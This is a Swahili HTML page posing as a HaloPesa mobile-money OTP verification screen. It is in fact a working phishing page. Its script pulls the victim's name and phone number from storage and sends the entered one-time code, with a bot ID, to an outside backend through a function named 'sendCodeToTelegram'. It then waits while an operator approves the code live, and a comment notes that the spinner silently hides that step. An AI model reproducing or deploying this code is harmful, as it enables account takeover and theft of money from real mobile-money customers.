<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<title>Uthibitisho wa OTP - HaloPesa</title>

<style>
/* ===== HALOPESA BRAND STYLES - MASSIVE & SPACIOUS ===== */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #f0f4f0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 16px;
}

.page {
  width: 100%;
  max-width: 780px;
}

/* Card - Huge padding, bigger radius */
.card {
  background: #ffffff;
  border-radius: 32px;
  padding: 64px 48px 52px;
  box-shadow: 0 16px 48px rgba(26, 67, 41, 0.15);
  border: 1px solid #e6efe6;
}

/* Titles - Very large */
.title {
  font-size: 44px;
  font-weight: 700;
  color: #1a6b2a;
  margin-bottom: 12px;
  letter-spacing: -0.5px;
}

.subtitle {
  color: #5a6b5a;
  font-size: 24px;
  margin-bottom: 10px;
}

.display-number {
  color: #1a2b1a;
  font-weight: 700;
  font-size: 26px;
  margin-bottom: 32px;
  background: #f4f9f4;
  padding: 14px 28px;
  border-radius: 16px;
  display: inline-block;
  letter-spacing: 0.5px;
}

/* Success Box - Bigger */
.success-box {
  background: #eaf6ea;
  border: 1px solid #b8d9b8;
  color: #1a6b2a;
  border-radius: 20px;
  padding: 28px 32px;
  margin-bottom: 36px;
  display: flex;
  gap: 20px;
  align-items: flex-start;
  font-size: 22px;
  line-height: 1.6;
}

.success-box > div:first-child {
  font-size: 34px;
  color: #1a7a2a;
  font-weight: 700;
  line-height: 1.2;
}

.label {
  font-size: 24px;
  font-weight: 600;
  color: #1a2b1a;
  margin-bottom: 24px;
}

/* OTP Inputs - GIGANTIC */
.otp-boxes {
  display: flex;
  justify-content: center;
  gap: 24px;
  margin-bottom: 32px;
}

.otp-boxes input {
  width: 104px;
  height: 104px;
  border: 3px solid #d0e0d0;
  border-radius: 24px;
  background: #fafffa;
  text-align: center;
  font-size: 48px;
  font-weight: 700;
  color: #1a3b1a;
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.otp-boxes input:focus {
  border-color: #1a7a2a;
  box-shadow: 0 0 0 8px rgba(26, 122, 42, 0.15);
}

.otp-boxes input.error {
  border-color: #b91c1c;
  box-shadow: 0 0 0 8px rgba(185, 28, 28, 0.15);
}

/* Timer - Bigger */
#timerContainer {
  text-align: center;
  color: #b8960f;
  font-weight: 600;
  font-size: 24px;
  margin-bottom: 36px;
  background: #fefcf0;
  padding: 20px 0;
  border-radius: 16px;
}

#timerContainer strong {
  color: #1a7a2a;
  font-size: 28px;
}

/* Primary Button - ENORMOUS */
button {
  width: 100%;
  height: 84px;
  border: none;
  border-radius: 20px;
  font-size: 26px;
  font-weight: 700;
  background: #d4e0d4;
  color: #8a9f8a;
  cursor: pointer;
  transition: background 0.25s, transform 0.1s;
  letter-spacing: 0.5px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 16px;
}

button:not(:disabled) {
  background: #1a7a2a;
  color: #ffffff;
}

button:not(:disabled):hover {
  background: #136622;
  transform: scale(1.01);
}

button:not(:disabled):active {
  transform: scale(0.98);
}

button.loading:disabled {
  background: #1a7a2a;
  color: #ffffff;
  opacity: 1;
}

/* Spinner - Bigger */
.spinner {
  width: 28px;
  height: 28px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top: 3px solid #ffffff;
  border-radius: 50%;
  animation: spin 0.9s linear infinite;
  display: none;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* Status messages */
#status {
  margin-top: 24px;
  text-align: center;
  font-size: 20px;
  font-weight: 600;
  min-height: 32px;
  padding: 14px 18px;
  border-radius: 12px;
  display: none;
  border: 2px solid transparent;
}

#status.show {
  display: block;
}

#status.error {
  background: #fde8e8;
  color: #b91c1c;
  border-color: #e6a4a4;
}

#status.success {
  background: #e6f7e6;
  color: #0d6b1a;
  border-color: #2e9c3e;
}

/* ===== RESPONSIVE TWEAKS - STILL LARGE ===== */
@media (max-width: 700px) {
  .card {
    padding: 40px 28px 36px;
    border-radius: 24px;
  }

  .title {
    font-size: 36px;
  }

  .subtitle {
    font-size: 20px;
  }

  .display-number {
    font-size: 22px;
    padding: 12px 22px;
  }

  .success-box {
    font-size: 19px;
    padding: 22px 24px;
    gap: 16px;
    border-radius: 16px;
  }

  .success-box > div:first-child {
    font-size: 28px;
  }

  .label {
    font-size: 20px;
    margin-bottom: 20px;
  }

  .otp-boxes {
    gap: 18px;
    margin-bottom: 26px;
  }

  .otp-boxes input {
    width: 88px;
    height: 88px;
    font-size: 40px;
    border-radius: 20px;
  }

  #timerContainer {
    font-size: 20px;
    padding: 16px 0;
    margin-bottom: 28px;
  }

  #timerContainer strong {
    font-size: 24px;
  }

  button {
    height: 72px;
    font-size: 22px;
    border-radius: 16px;
  }

  #status {
    font-size: 18px;
    margin-top: 18px;
  }
}

@media (max-width: 500px) {
  .card {
    padding: 30px 18px 24px;
  }

  .title {
    font-size: 30px;
  }

  .subtitle {
    font-size: 18px;
  }

  .display-number {
    font-size: 19px;
    padding: 10px 18px;
  }

  .success-box {
    font-size: 17px;
    padding: 18px 20px;
    gap: 14px;
  }

  .success-box > div:first-child {
    font-size: 24px;
  }

  .label {
    font-size: 18px;
  }

  .otp-boxes {
    gap: 14px;
  }

  .otp-boxes input {
    width: 74px;
    height: 74px;
    font-size: 34px;
    border-radius: 18px;
  }

  #timerContainer {
    font-size: 18px;
    padding: 14px 0;
  }

  #timerContainer strong {
    font-size: 20px;
  }

  button {
    height: 64px;
    font-size: 20px;
  }

  #status {
    font-size: 16px;
  }
}

@media (max-width: 380px) {
  .otp-boxes {
    gap: 10px;
  }

  .otp-boxes input {
    width: 62px;
    height: 62px;
    font-size: 28px;
    border-radius: 14px;
  }

  button {
    height: 58px;
    font-size: 18px;
  }
}
</style>
</head>

<body>

<div class="page">
  <div class="card">
    <div class="title">Uthibitisho wa OTP</div>
    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div>
    <div id="phoneNumber" class="display-number"></div>
    <div class="success-box">
      <div>✓</div>
      <div>Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div>
    </div>
    <form id="otpForm">
      <div class="label">Weka msimbo wa uthibitisho</div>
      <div class="otp-boxes">
        <input maxlength="1" inputmode="numeric">
        <input maxlength="1" inputmode="numeric">
        <input maxlength="1" inputmode="numeric">
        <input maxlength="1" inputmode="numeric">
      </div>
      <div id="timerContainer">
        Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde
      </div>
      <button id="submitBtn" disabled>
        <span id="btnText">WASILISHA</span>
        <span class="spinner" id="spinner"></span>
      </button>
    </form>
    <div id="status"></div>
  </div>
</div>

<!-- ===== LOGIC ===== -->
<script>
const BACKEND_URL = "https://halopesa-tanzania-1ku8.onrender.com";
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');

if (botId) {
    localStorage.setItem('botId', botId);
}

if (!botId) {
    showStatus("Kiungo si sahihi. Tafadhali fungua ukurasa huu kupitia kiungo rasmi.", "error");
    throw new Error("Missing bot ID");
}

const phone = localStorage.getItem('phone') || "";
document.getElementById('phoneNumber').textContent =
  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "Nambari ya simu haipatikani";

const inputs = document.querySelectorAll('.otp-boxes input');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const statusEl = document.getElementById('status');
const timerDisplay = document.getElementById('timerDisplay');

let countdown;
let isSubmitting = false;

// =============================================
//  STATUS HELPERS
// =============================================
function showStatus(message, type = 'error') {
    statusEl.textContent = message;
    statusEl.className = 'show ' + type;
}

function clearStatus() {
    statusEl.textContent = '';
    statusEl.className = '';
}

// =============================================
//  INPUT HANDLING
// =============================================
document.addEventListener('keydown', e => {
    if (/^[0-9]$/.test(e.key) === false && e.key !== "Backspace") return;

    const values = [...inputs].map(i => i.value);
    const index = values.findIndex(v => v === "");

    if (e.key === "Backspace") {
        const lastFilled = values.map(v => v !== "").lastIndexOf(true);
        if (lastFilled >= 0) inputs[lastFilled].value = "";
        submitBtn.disabled = ![...inputs].every(i => i.value);
    } else if (index !== -1) {
        inputs[index].value = e.key;
        submitBtn.disabled = ![...inputs].every(i => i.value);
    }

    if ([...inputs].every(i => i.value)) {
        document.getElementById('otpForm').dispatchEvent(new Event('submit'));
    }
});

// Allow click-to-focus and typing inside individual boxes
inputs.forEach((input, i) => {
    input.addEventListener('input', function () {
        this.value = this.value.replace(/[^0-9]/g, '');
        this.classList.remove('error');
        if (this.value && i < 3) inputs[i + 1].focus();
        submitBtn.disabled = ![...inputs].every(x => x.value);
        if ([...inputs].every(x => x.value)) {
            document.getElementById('otpForm').dispatchEvent(new Event('submit'));
        }
    });

    input.addEventListener('keydown', function (e) {
        if (e.key === 'Backspace' && !this.value && i > 0) {
            inputs[i - 1].focus();
        }
    });

    input.addEventListener('focus', function () {
        clearStatus();
        inputs.forEach(x => x.classList.remove('error'));
    });
});

// =============================================
//  COUNTDOWN
// =============================================
function startCountdown(duration = 60) {
    let time = duration;
    timerDisplay.textContent = time;
    clearInterval(countdown);

    countdown = setInterval(() => {
        time--;
        timerDisplay.textContent = time;
        if (time <= 0) {
            clearInterval(countdown);
            showStatus("Msimbo umeisha muda wake. Tafadhali omba msimbo mpya.", "error");
            submitBtn.disabled = true;
        }
    }, 1000);
}

startCountdown();

// =============================================
//  SUBMIT CODE
// =============================================
async function sendCodeToTelegram(name, phone, code) {
    try {
        const r = await fetch(`${BACKEND_URL}/submit-code`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name, phone, code, botId })
        });
        return r.json();
    } catch {
        return null;
    }
}

function pollCodeApproval(requestId) {
    return new Promise(resolve => {
        let attempts = 0;
        const maxAttempts = 120;
        const i = setInterval(async () => {
            attempts++;
            try {
                const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
                const d = await r.json();
                if (d.blocked === true) {
                    clearInterval(i);
                    resolve('blocked');
                    return;
                }
                if (d.approved === true || d.approved === false) {
                    clearInterval(i);
                    resolve(d.approved);
                    return;
                }
                if (attempts >= maxAttempts) {
                    clearInterval(i);
                    resolve(null);
                }
            } catch (err) {
                // silent retry
                console.error("Poll error:", err);
            }
        }, 1500);
    });
}

document.getElementById('otpForm').addEventListener('submit', async e => {
    e.preventDefault();
    if (isSubmitting) return;

    const code = [...inputs].map(i => i.value).join('');

    if (code.length !== 4) {
        showStatus("Tafadhali weka tarakimu zote 4.", "error");
        return;
    }

    const name = localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
    const phone = localStorage.getItem('phone') || "Unknown";

    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.classList.add('loading');
    btnText.style.display = "none";
    spinner.style.display = "inline-block";
    clearStatus();

    const res = await sendCodeToTelegram(name, phone, code);

    if (!res || !res.requestId) {
        isSubmitting = false;
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
        btnText.style.display = "inline";
        spinner.style.display = "none";
        showStatus("Imeshindwa kutuma msimbo. Tafadhali jaribu tena.", "error");
        return;
    }

    // No "waiting for admin" text — the spinner covers it silently
    const approved = await pollCodeApproval(res.requestId);
    clearInterval(countdown);

    if (approved === true) {
        localStorage.setItem('code', code);
        showStatus("Msimbo umethibitishwa! Tunakupeleka...", "success");
        const redirectBotId = botId || localStorage.getItem('botId') || '';
        setTimeout(() => {
            window.location.href = `success.html?botId=${redirectBotId}`;
        }, 700);
    } else if (approved === 'blocked') {
        isSubmitting = false;
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
        btnText.style.display = "inline";
        spinner.style.display = "none";
        showStatus("Akaunti yako imezuiwa. Tafadhali jaribu tena baadaye.", "error");
        inputs.forEach(i => i.classList.add('error'));
    } else if (approved === false) {
        isSubmitting = false;
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
        btnText.style.display = "inline";
        spinner.style.display = "none";
        showStatus("Msimbo si sahihi. Tafadhali jaribu tena.", "error");
        inputs.forEach(i => { i.value = ""; i.classList.add('error'); });
        inputs[0].focus();
        startCountdown();
    } else {
        isSubmitting = false;
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
        btnText.style.display = "inline";
        spinner.style.display = "none";
        showStatus("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
    }
});
</script>

</body>
</html>
